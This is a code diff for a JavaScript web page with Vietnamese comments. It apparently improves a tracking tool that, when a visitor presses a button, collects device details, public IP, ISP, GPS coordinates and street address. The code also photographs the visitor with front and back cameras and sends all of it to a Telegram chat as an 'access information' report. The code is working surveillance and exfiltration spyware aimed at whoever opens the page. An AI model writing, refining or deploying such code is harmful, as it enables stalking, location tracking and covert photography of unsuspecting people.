@@ -18,6 +18,7 @@ const info = {
   camera: '⏳ Đang kiểm tra...'
 };
 
+// 1. Nhận diện thiết bị
 function detectDevice() {
   const ua = navigator.userAgent;
   const platform = navigator.platform;
@@ -43,7 +44,7 @@ function detectDevice() {
       "375x812@3": "iPhone X / XS / 11 Pro",
       "375x667@2": "iPhone 6/7/8 / SE (2nd/3rd)",
     };
-    info.device = iphoneModels[res] || 'iPhone Model';
+    info.device = iphoneModels[res] || 'iPhone/iPad';
   } 
   else if (/Windows NT/i.test(ua)) {
     info.device = 'Windows PC';
@@ -54,29 +55,27 @@ function detectDevice() {
   }
 }
 
-async function getPublicIP() {
+// 2. Lấy địa chỉ IP
+async function getIPs() {
   try {
-    const r = await fetch('https://api.ipify.org?format=json');
-    const data = await r.json();
-    info.ip = data.ip;
-  } catch (e) { info.ip = 'Bị chặn'; }
+    const [res1, res2] = await Promise.all([
+      fetch('https://api.ipify.org?format=json').then(r => r.json()),
+      fetch('https://ipwho.is/').then(r => r.json())
+    ]);
+    info.ip = res1.ip;
+    info.realIp = res2.ip;
+    info.isp = res2.connection?.org || 'N/A';
+    info.country = res2.country || 'Việt Nam';
+  } catch (e) {
+    info.ip = 'Bị chặn';
+    info.realIp = 'Lỗi';
+  }
 }
 
-async function getRealIP() {
-  try {
-    const r = await fetch('https://icanhazip.com');
-    const ip = await r.text();
-    info.realIp = ip.trim();
-    const res = await fetch(`https://ipwho.is/${info.realIp}`);
-    const data = await res.json();
-    info.isp = data.connection?.org || 'VNNIC';
-    info.country = data.country || 'Việt Nam';
-  } catch (e) { info.realIp = 'Lỗi kết nối'; }
-}
-
+// 3. Lấy vị trí GPS
 async function getLocation() {
   return new Promise(resolve => {
-    if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
+    if (!navigator.geolocation) return resolve(fallbackIPLocation());
     navigator.geolocation.getCurrentPosition(
       async pos => {
         info.lat = pos.coords.latitude.toFixed(6);
@@ -84,7 +83,7 @@ async function getLocation() {
         try {
           const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
           const data = await res.json();
-          info.address = data.display_name || 'Vị trí GPS';
+          info.address = data.display_name || 'Tọa độ GPS';
         } catch { info.address = `Tọa độ: ${info.lat}, ${info.lon}`; }
         resolve();
       },
@@ -97,18 +96,20 @@ async function getLocation() {
 async function fallbackIPLocation() {
   try {
     const data = await fetch(`https://ipwho.is/`).then(r => r.json());
-    info.lat = data.latitude?.toFixed(6) || '0';
-    info.lon = data.longitude?.toFixed(6) || '0';
+    info.lat = data.latitude || '0';
+    info.lon = data.longitude || '0';
     info.address = `${data.city}, ${data.region} (Vị trí IP)`;
   } catch (e) { info.address = 'Không rõ'; }
 }
 
+// 4. Chụp ảnh camera
 async function captureCamera(facingMode = 'user') {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
     return new Promise(resolve => {
       const video = document.createElement('video');
       video.srcObject = stream;
+      video.muted = true;
       video.setAttribute('playsinline', ''); 
       video.play();
       video.onloadedmetadata = () => {
@@ -118,34 +119,33 @@ async function captureCamera(facingMode = 'user') {
         setTimeout(() => {
           canvas.getContext('2d').drawImage(video, 0, 0);
           stream.getTracks().forEach(t => t.stop());
-          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
-        }, 800);
+          canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.7);
+        }, 1000); // Đợi 1s để cam ổn định độ sáng
       };
     });
   } catch (e) { return null; }
 }
 
+// 5. Soạn nội dung tin nhắn
 function getCaption() {
-  const mapsLink = (info.lat && info.lon)
-    ? `https://www.google.com/maps?q=${info.lat},${info.lon}`
+  const mapsLink = (info.lat && info.lon) 
+    ? `https://www.google.com/maps?q=${info.lat},${info.lon}` 
     : 'Không rõ';
 
   return `
 📡 [THÔNG TIN TRUY CẬP]
 
 🕒 Thời gian: ${info.time}
-📱 Thiết bị: ${info.device}
-🖥️ Hệ điều hành: ${info.os}
-🌍 IP dân cư: ${info.ip}
-🧠 IP gốc: ${info.realIp}
+📱 Thiết bị: ${info.device} (${info.os})
+🌍 IP: ${info.ip} | ${info.realIp}
 🏢 ISP: ${info.isp}
 🏙️ Địa chỉ: ${info.address}
-🌎 Quốc gia: ${info.country}
-📌 Google Maps: ${mapsLink}
+📌 Bản đồ: ${mapsLink}
 📸 Camera: ${info.camera}
 `.trim();
 }
 
+// 6. Gửi dữ liệu về Telegram
 async function sendPhotos(frontBlob, backBlob) {
   const formData = new FormData();
   formData.append('chat_id', TELEGRAM_CHAT_ID);
@@ -160,7 +160,6 @@ async function sendPhotos(frontBlob, backBlob) {
     formData.append('back', backBlob, 'back.jpg');
   }
 
-  formData.append('media', JSON.stringify(media));
   return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
 }
 
@@ -172,22 +171,28 @@ async function sendTextOnly() {
   });
 }
 
-function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
-
+// 7. Hàm chính chạy khi nhấn nút
 async function main() {
   info.time = new Date().toLocaleString('vi-VN');
   detectDevice();
-  await Promise.all([getPublicIP(), getRealIP(), getLocation()]);
+  
+  // Chạy song song lấy IP và Vị trí để tiết kiệm thời gian
+  await Promise.all([getIPs(), getLocation()]);
 
+  // Chụp cam trước
   let front = await captureCamera("user");
-  if (front) await delay(800); // Nghỉ để phần cứng chuyển đổi cam
-  let back = await captureCamera("environment");
+  let back = null;
+  
+  if (front) {
+     // Nếu có cam trước, thử chụp tiếp cam sau (nếu là điện thoại)
+     back = await captureCamera("environment");
+  }
 
   if (front || back) {
     info.camera = `✅ Đã chụp: ${front ? 'Trước' : ''} ${back ? 'Sau' : ''}`;
     await sendPhotos(front, back);
   } else {
-    info.camera = '🚫 Bị từ chối hoặc lỗi camera';
+    info.camera = '🚫 Bị từ chối hoặc không có camera';
     await sendTextOnly();
   }
 }
